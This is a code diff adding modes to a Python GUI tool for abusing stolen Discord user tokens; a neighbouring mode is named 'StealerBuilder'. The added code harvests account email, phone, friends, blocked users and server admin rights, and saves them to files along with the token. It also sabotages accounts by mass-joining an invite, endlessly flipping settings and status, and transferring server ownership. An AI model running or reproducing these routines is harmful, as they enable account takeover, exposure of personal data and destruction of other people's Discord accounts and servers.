@@ -1341,6 +1341,153 @@ elif mode == "StealerBuilder":
             build()
     window.Close()
 
+elif mode == "InfoToken":
+    headers = {'Authorization': sys.argv[6], 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
+    src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
+    response = json.loads(src.content)
+    try:
+        info = "Name: {}#{}\nID: {}\nEmail: {}\nPhone: {}\nLanguage: {}\n".format(response['username'],response['discriminator'],response['id'],response['email'],response['phone'],response['locale'])
+    except Exception:
+        sg.Popup("Unable to get info on token.", title="Error")
+    else:
+        lay = [
+              [sg.Multiline(info,size=(50,10))],
+              [sg.Button("Export")]
+              ]
+        window = sg.Window("Information on {}".format(response['username'])).Layout(lay)
+        event, values = window.Read()
+        if event is None or event == 'Exit':
+            pass
+        elif event == "Export":
+            if not os.path.isdir("users"):
+                os.mkdir("users")
+            with open("users/{}.txt".format(response['username']), "w+", errors='ignore') as handle:
+                handle.write(info)
+                sg.Popup("Exported info for {} to files/{}.txt".format(response['username'],response['username']),title="Exported")
+
+elif mode == "HeavyInfo":
+    import discord
+    import unicodedata
+    import string
+    token = sys.argv[6]
+    client = discord.Client()
+    valid_chars = "-_.() %s%s" % (string.ascii_letters, string.digits)
+    valid_filename_chars = "-_.() %s%s" % (string.ascii_letters, string.digits)
+    char_limit = 255
+    def clean_filename(filename, whitelist=valid_filename_chars, replace=' '):
+        for r in replace:
+            filename = filename.replace(r,'_')
+        cleaned_filename = unicodedata.normalize('NFKD', filename).encode('ASCII', 'ignore').decode()
+        cleaned_filename = ''.join(c for c in cleaned_filename if c in whitelist)
+        if len(cleaned_filename)>char_limit:
+            print("Warning, filename truncated because it was over {}. Filenames may no longer be unique".format(char_limit))
+        return cleaned_filename[:char_limit]
+    @client.event
+    async def on_ready():
+        fn = clean_filename(client.user.name)
+        with open ('users/{}_HEAVY.txt'.format(client.user.name),'w+',errors='ignore') as handle:
+            handle.write('====================================\n')
+            handle.write('Token: '+token+'\n')
+            handle.write('Email: '+str(client.user.email)+'\n')
+            handle.write('Phone: '+str(client.user.phone)+'\n')
+            handle.write('Username: '+client.user.name+'#'+client.user.discriminator+'\n')
+            handle.write('User ID: '+str(client.user.id)+'\n')
+            handle.write('Created on: '+str(client.user.created_at)+'\n')
+            handle.write('Verified: '+str(client.user.verified)+'\n')
+            handle.write('MFA Enabled: ' + str(client.user.mfa_enabled)+'\n')
+            handle.write('Discord Nitro: '+str(client.user.premium)+'\n')
+            handle.write('Avatar URL: '+str(client.user.avatar_url)+'\n')
+            handle.write('====================================\n')
+            handle.write('Member of '+str(len(client.guilds))+' servers.\n')
+            handle.write('User has '+str(len(client.user.friends))+' friends.\n')
+            handle.write('User has blocked '+str(len(client.user.blocked))+' people.\n')
+            handle.write('====================================\nFriends:\n====================================\n')
+            if len(client.user.friends) == 0:
+                handle.write('None.\n\n')
+            else:
+                for friend in client.user.friends:
+                    handle.write('Name: '+str(friend.name)+'#'+str(friend.discriminator)+'\n')
+                    handle.write('ID: '+str(friend.id)+'\n\n')
+            handle.write('====================================\nBlocked Users:\n====================================\n')
+            if len(client.user.blocked) == 0:
+                handle.write('None.\n\n')
+            else:
+                for block in client.user.blocked:
+                    handle.write('Name: '+str(block.name)+'#'+str(block.discriminator)+'\n')
+                    handle.write('ID: '+str(block.id)+'\n\n')
+            handle.write('====================================\nServers:\n====================================\n')
+            if len(client.guilds) == 0:
+                handle.write('None.\n\n')
+            else:
+                for server in client.guilds:
+                    handle.write('Name: '+server.name+'\n')
+                    handle.write('ID: '+str(server.id)+'\n')
+                    if server.owner.id == client.user.id:
+                        serverowner = True
+                    else:
+                        serverowner = False
+                    for channel in server.text_channels:
+                        myperms = channel.permissions_for(server.get_member(client.user.id))
+                        break
+                    handle.write('Member Count: ' + str(len(server.members))+'\n')
+                    handle.write('Channel Count: '+str(len(server.channels))+'\n')
+                    handle.write('Role Count: '+str(len(server.roles))+'\n')
+                    handle.write('Owner: '+str(serverowner)+'\n')
+                    handle.write('Admin: '+str(myperms.administrator)+'\n\n')
+            handle.write('====================================\n')
+        try:
+            await client.close()
+            sg.Popup("Heavy Info Gather is complete.",title="Complete")
+        except Exception:
+            pass
+    client.run(token, bot=False)
+
+elif mode == "Terminator":
+    import discord
+    token = sys.argv[6]
+    client = discord.Client()
+    @client.event
+    async def on_ready():
+        sg.PopupNonBlocking("Fucking the token, Please wait.")
+        await client.change_presence(activity=discord.Game(name='help'), status=discord.Status.do_not_disturb, afk=True)
+        for x in range(30):
+            headers = {'Authorization': token}
+            requests.post("https://canary.discordapp.com/api/v6/invite/uAsrUTu", headers=headers)
+        await client.close()
+        sg.Popup("Token was Fucked")
+    sg.PopupNonBlocking("Preparing to fuck the token...",title="Starting")
+    client.run(token,bot=False)
+
+elif mode == "CG":
+    from itertools import cycle
+    token = sys.argv[6]
+    headers = {'Authorization': token, 'Content-Type': 'application/json'}
+    payload = {'theme': "light", 'locale': "ja", 'message_display_compact': 'true', 'enable_tts_command': 'false', 'inline_embed_media': 'false',
+    'inline_attachment_media': 'false', 'gif_auto_play': 'false', 'render_embeds': 'false', 'render_reactions': 'false', 'animate_emoji': 'false',
+    'convert_emoticons': 'false','enable_tts_command': 'true', 'explicit_content_filter': '0', 'status': "invisible"}
+    requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers,json=payload)
+    locales = ['da','de','es-ES','fr','hr','it','lt',"hu","nl","no","pl","pt-BR","ro","fi","sv-SE","vi","tr"]
+    modes = cycle(["light","dark"])
+    statuses = cycle(["online","idle","dnd","invisible"])
+    while True:
+        setting = {'theme': next(modes), 'locale': random.choice(locales), 'status': next(statuses)}
+        requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers,json=setting)
+
+elif mode == "Ownership":
+    lay = [
+          [sg.Text('Server ID',size=(10,1)), sg.Input(key="ServerID")],
+          [sg.Text('New Owner ID',size=(10,1)), sg.Input(key="OwnerID")],
+          [sg.Button("Transfer")]
+          ]
+    window = sg.Window("Transfer Ownership").Layout(lay)
+    event, values = window.Read()
+    if event is None:
+        pass
+    else:
+        headers = {'Authorization': sys.argv[6], 'Content-Type': 'application/json'}
+        payload = {'owner_id': values['OwnerID']}
+        src = requests.patch("https://ptb.discordapp.com/api/v6/guilds/{}".format(values["ServerID"]),headers=headers,json=payload)
+        sg.Popup("Ownership Should have been transferred.")
 
 elif mode == 'ree':
     picdata = requests.get("https://gist.githubusercontent.com/DeadBread76/3d93e55fe4a9e4c7324c2f0b13cf24ac/raw/7d433bb5187c5d2c1fc74c310ff0638790491c87/Special%2520surprise.txt")
